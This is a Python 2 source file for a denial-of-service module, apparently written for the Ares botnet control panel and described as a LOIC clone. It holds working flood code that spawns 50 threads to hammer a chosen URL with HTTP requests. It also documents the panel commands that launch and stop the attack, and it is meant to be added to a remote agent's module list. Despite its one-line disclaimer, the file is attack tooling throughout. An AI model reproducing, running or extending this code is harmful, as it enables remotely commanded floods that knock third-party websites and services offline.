# Ares HTTP-DDoS Module (LOIC Clone)
# Pythogen
# Build 1.2

# Not intended for illegal uses.

# 12/27/2015 - 4:34 PM - Bug fix: DDoS completion notice now correctly synchronized.

# 12/27/2015 - 4:42 PM - Update: Functional stop feature now included.

# 12/29/2015 - 1:01 PM - Update: Functionality refinement. Clean up syntax.

# 12/29/2015 - 2:58 PM - Update: Informs when every thousand requests have been sent until completion. (Panel Feedback)

# Panel commands:

# ddos http://[host]/ [requests]
# ddos http://something.com/ 10000
# ddos stop 0

# Make sure to include 'ddos' in MODULES array in agent.py


# - Import Modules -

import requests
import time
import threading
import pythoncom
import pyHook
import random
import socket
import sys
import os
import string

from threading import Thread
from urllib import urlopen
from atexit import register
from os import _exit
from sys import stdout, argv



# - Stress functions -


# Note: 10 Threads
def auto_send_request(server, number_of_requests=10):
    # Globalize increment variable
    global inc
    global isDos

    # Value for completion notification condition
    requestsCheck = (requests - 1)

    for z in range(number_of_requests):
        try:

            # Is it active?
            if isDos == True:

                # HTTP Connection >>
                urlopen(server)

                # Successful connection [!]
                print "." # indicated by period in console (for debugging)

                # Increment ++
                inc = inc + 1 # Count total requests sent

                # Live display every thousand requests. 
                if inc % 1000 == 0:
                    print "Requests: %s." % (inc)


            # if not active then break ..
            elif isDos == False:
                break

        except IOError:
            # Failed connection [!]
            print "E" # indicated by E in console (for debugging)

        # Request count checking
        if inc >= requestsCheck:

            # Finished DDoS Session! Call next function
            print "Finished Stress Procedure"

                

# Flood routine
def flood(url, number_of_requests = 1000, number_of_threads = 50):  
    number_of_requests_per_thread = int(number_of_requests/number_of_threads)
    try:
        for x in range(number_of_threads):
            Thread(target=auto_send_request, args=(url, number_of_requests_per_thread)).start()

    except:
        print("\n[E]\n")
    print "\nDone %i requests on %s" % (number_of_requests, url)



# - Command control -

def run(action, num_req):    
    # Globalize variables
    global requests
    global inc
    global isDos

    # inc initially set to 0
    inc = 0

    # isDos boolean
    isDos = False

    # If command passed is not 'stop' then it's a host
    if action != "stop":
        print "DDoS Started."
        
        # Boolean value that determines if stresser is active
        isDos = True

        # Argument passed from Ares panel
        server = action # Host put in server

        # Number of requests
        requests = int(num_req) # Specified number of requests

        # Call function to begin attack
        flood(server, requests)


    # Halt process
    elif action == "stop":

        # Turn it off
        isDos = False
        print 'DDoS Stopped.'
    else:

        # Display current commands
        print "Usage: DDoS [host] [requests]|stop 0"


def torbDoS():
    x = raw_input("Enter Host: ")
    y = raw_input("Enter Requests: ")
    run(x,y)

torbDoS()